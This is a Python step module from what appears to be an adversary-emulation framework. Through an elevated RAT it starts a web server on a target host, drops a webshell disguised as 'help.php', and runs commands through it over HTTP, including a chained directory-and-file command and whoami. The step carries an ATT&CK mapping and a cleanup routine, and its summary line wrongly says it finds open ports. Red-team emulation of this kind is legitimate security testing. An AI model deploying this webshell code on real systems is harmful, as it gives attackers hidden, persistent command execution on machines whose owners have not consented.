from plugins.adversary.app.operation.operation import Step, OPProcess, OPSoftware, OPRat, OPVar, OPHost, OPFile
from plugins.adversary.app.commands import *
from plugins.adversary.app.custom import *

class WebShellExecution(Step):
    """    Description:
            This step creates a Webshell server on port 8080.
           Requirements:
            This step only requires the existence of a RAT on a host in order to run.
    """
    display_name = 'webshell_execution'
    summary = 'Find open ports (externally) on the current host.'
    attack_mapping = [('T1094', 'Command and Control')]
    preconditions = [('rat', OPRat({'elevated': True})),
                     ('host', OPHost(OPVar('software.host'))),
                     ('software', OPSoftware({'name': 'webserver', 'installed': True }))]
    postconditions = [('process_g', OPProcess), ('file_g', OPFile)]

    significant_parameters = ['host']

    @staticmethod
    def description(host):
        return 'Setting up Webshell on {}'.format(host.fqdn)

    @staticmethod
    async def action(operation, rat, host, software, process_g, file_g):
        webserver_location = (software.install_loc + 'usbwebserver.exe')
        successful = (await operation.execute_shell_command(rat, command.CommandLine('powershell /command "$completed = $false; while(-not $completed){{ try {{ Start-Process \'{}\'; $completed = $true; }} catch {{ start-sleep 5; }} }}"'.format(webserver_location)), (lambda x: (x.strip() == ''))))
        if successful:
            (await process_g({
                'image_name': get_image_name(webserver_location),
                'host': host,
            }))
            destination = (software.install_loc + 'root\\help.php')
            (await operation.drop_file(rat, file_path_dest=destination, file_path_src=os.path.join('files', 'webshell.php')))
            (await file_g({
                'path': destination,
                'host': host,
            }))
            try:
                params = {
                    'cmd': 'mkdir wamp && mkdir wamp\\www && (echo test > wamp/www/info.php)',
                }
                requests.get('http://{}:8080/help.php?{}'.format(host.fqdn, urlencode(params, quote_via=quote_plus))).text
                result = requests.get('http://{}:8080/help.php?cmd={}'.format(host.fqdn, 'whoami')).text
                return ((result is not None) and (result != ''))
            except requests.exceptions.RequestException as e:
                print(e)
                return False
        return False

    @staticmethod
    async def cleanup(cleaner, host, process_g, file_g):
        for process in process_g:
            await cleaner.delete(process)
        for file in file_g:
            await cleaner.delete(file)
